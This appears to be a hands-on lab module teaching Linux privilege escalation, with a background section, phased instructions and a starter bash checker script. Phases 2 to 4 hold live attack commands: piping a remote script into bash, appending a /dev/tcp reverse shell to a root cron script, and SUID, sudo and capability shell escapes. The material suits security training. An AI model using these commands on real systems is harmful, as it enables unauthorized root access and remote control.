## 📖 Background

Privilege escalation exploits the gap between intended access control and actual system configuration. Defenders configure permissions, but mistakes happen: a forgotten SUID bit, a cron job running a world-writable script as root, a sudo rule that allows command injection, or an unpatched kernel. Recognizing these patterns is the core skill.

Key concepts:
- **SUID/SGID** — Special permission bits that run a binary as its owner (often root)
- **Capabilities** — Fine-grained privilege assignments replacing monolithic SUID
- **Sudo Misconfigurations** — Overly permissive sudo rules that allow escalation
- **Cron Jobs** — Scheduled tasks that may run as root with writable dependencies
- **Kernel Exploits** — Vulnerabilities in the OS kernel itself granting root access
- **PATH Hijacking** — Exploiting relative paths in privileged scripts

## 🔬 Lab Instructions

### Phase 1: System Enumeration

1. Begin with manual enumeration of the target system:
   ```bash
   whoami && id && hostname
   uname -a
   cat /etc/os-release
   ```
2. Check sudo permissions for the current user:
   ```bash
   sudo -l
   ```
3. Find all SUID and SGID binaries:
   ```bash
   find / -perm -4000 -type f 2>/dev/null
   find / -perm -2000 -type f 2>/dev/null
   ```
4. Search for writable files and directories in sensitive locations:
   ```bash
   find / -writable -type f 2>/dev/null | grep -v proc
   find /etc -writable -type f 2>/dev/null
   ```
5. Enumerate cron jobs and scheduled tasks:
   ```bash
   crontab -l
   ls -la /etc/cron*
   cat /etc/crontab
   systemctl list-timers
   ```

### Phase 2: Automated Enumeration with LinPEAS

1. Transfer LinPEAS to the target (or use it from a shared mount):
   ```bash
   curl http://10.10.10.5:8000/linpeas.sh | bash
   ```
2. Review the output, paying special attention to red and yellow highlights
3. Focus on these sections:
   - SUID binaries with known GTFOBins entries
   - Writable paths in cron jobs
   - Sudo rules with wildcards or escape vectors
   - Interesting files (passwords, SSH keys, config files)
4. Cross-reference findings with GTFOBins: https://gtfobins.github.io/

### Phase 3: SUID and Capability Exploitation

1. Identify an exploitable SUID binary (e.g., a custom binary or known GTFOBins entry):
   ```bash
   find / -perm -4000 -type f 2>/dev/null
   ```
2. Check GTFOBins for the SUID exploitation method. Example with `find`:
   ```bash
   find . -exec /bin/sh -p \; -quit
   ```
3. Check for binaries with elevated capabilities:
   ```bash
   getcap -r / 2>/dev/null
   ```
4. Exploit a capability — for example, `python3` with `cap_setuid`:
   ```bash
   python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
   ```
5. Verify escalation with `whoami` and `id`

### Phase 4: Sudo and Cron Abuse

1. If `sudo -l` reveals a permitted command, check GTFOBins for escalation:
   ```bash
   # Example: sudo allows vim
   sudo vim -c '!sh'
   # Example: sudo allows less
   sudo less /etc/passwd    # then type !sh
   ```
2. Identify a cron job running as root that references a writable script:
   ```bash
   cat /etc/crontab
   ls -la /opt/scripts/backup.sh
   ```
3. Inject a reverse shell into the writable cron script:
   ```bash
   echo 'bash -i >& /dev/tcp/10.10.10.5/4444 0>&1' >> /opt/scripts/backup.sh
   ```
4. Set up a listener and wait for the cron job to fire:
   ```bash
   nc -lvnp 4444
   ```
5. Exploit PATH hijacking in scripts that call binaries without absolute paths:
   ```bash
   echo '/bin/bash' > /tmp/service
   chmod +x /tmp/service
   export PATH=/tmp:$PATH
   # Run the vulnerable SUID binary that calls "service"
   ```

### Phase 5: Kernel Exploits and Windows Basics

1. Check the kernel version for known vulnerabilities:
   ```bash
   uname -r
   searchsploit linux kernel <version> privilege escalation
   ```
2. Understand the kernel exploit workflow: identify version → find exploit → compile → execute
3. Review a classic example like Dirty COW (CVE-2016-5195) — study the concept without executing on production
4. For Windows targets, learn the WinPEAS workflow:
   ```cmd
   whoami /priv
   systeminfo
   winpeas.exe
   ```
5. Understand key Windows vectors: unquoted service paths, DLL hijacking, token impersonation

## 🛠️ Build Your Own

**Build Objective:** Create a custom privilege escalation checker

### Requirements
- Enumerates SUID binaries and cross-references with a known-exploitable list
- Checks sudo permissions for common escape vectors
- Identifies writable cron job scripts
- Reports findings sorted by exploitation likelihood

### Starter Framework
```bash
#!/bin/bash
# GRIMOIRE Privesc Checker - LAB-013 Build Your Own

RED='\033[0;31m'
YELLOW='\033[1;33m'
GREEN='\033[0;32m'
NC='\033[0m'

KNOWN_GTFOBINS=("vim" "find" "nmap" "python" "python3" "perl" "ruby" "less" "more" "awk" "bash" "env" "ftp" "gcc" "nano" "tar" "zip" "cp")

echo "=============================="
echo " GRIMOIRE Privesc Checker"
echo "=============================="
echo "[*] Running as: $(whoami) ($(id))"
echo "[*] Kernel: $(uname -r)"
echo ""

check_suid() {
    echo -e "${YELLOW}[*] Checking SUID binaries...${NC}"
    suid_bins=$(find / -perm -4000 -type f 2>/dev/null)
    for bin in $suid_bins; do
        name=$(basename "$bin")
        for known in "${KNOWN_GTFOBINS[@]}"; do
            if [ "$name" = "$known" ]; then
                echo -e "  ${RED}[!] Exploitable SUID: $bin (GTFOBins: $name)${NC}"
            fi
        done
    done
    # TODO: Also check for custom/unusual SUID binaries
}

check_sudo() {
    echo -e "${YELLOW}[*] Checking sudo permissions...${NC}"
    sudo_output=$(sudo -l 2>/dev/null)
    if [ -n "$sudo_output" ]; then
        echo "$sudo_output"
        # TODO: Parse sudo output for NOPASSWD entries and GTFOBins matches
    else
        echo "  [i] Cannot check sudo (may need password)"
    fi
}

check_cron() {
    echo -e "${YELLOW}[*] Checking cron jobs for writable scripts...${NC}"
    # TODO: Parse /etc/crontab and cron directories for scripts
    #       Check if any referenced scripts are world-writable
    if [ -f /etc/crontab ]; then
        grep -v "^#" /etc/crontab | grep -v "^$" | while read -r line; do
            script=$(echo "$line" | awk '{print $NF}')
            if [ -f "$script" ] && [ -w "$script" ]; then
                echo -e "  ${RED}[!] Writable cron script: $script${NC}"
            fi
        done
    fi
}

check_capabilities() {
    echo -e "${YELLOW}[*] Checking file capabilities...${NC}"
    # TODO: Find binaries with elevated capabilities
    getcap -r / 2>/dev/null | while read -r line; do
        echo -e "  ${RED}[!] Capability found: $line${NC}"
    done
}

check_writable_paths() {
    echo -e "${YELLOW}[*] Checking writable paths in sensitive locations...${NC}"
    # TODO: Check /etc, /usr/local/bin, and paths in $PATH for writability
    for dir in /usr/local/bin /usr/local/sbin; do
        if [ -w "$dir" ]; then
            echo -e "  ${RED}[!] Writable directory in PATH: $dir${NC}"
        fi
    done
}

# Run all checks
check_suid
check_sudo
check_cron
check_capabilities
check_writable_paths

echo ""
echo -e "${GREEN}[+] Privesc check complete.${NC}"
```

- [ ] Writable cron scripts are flagged
- [ ] File capabilities are enumerated
- [ ] Output uses color coding for severity
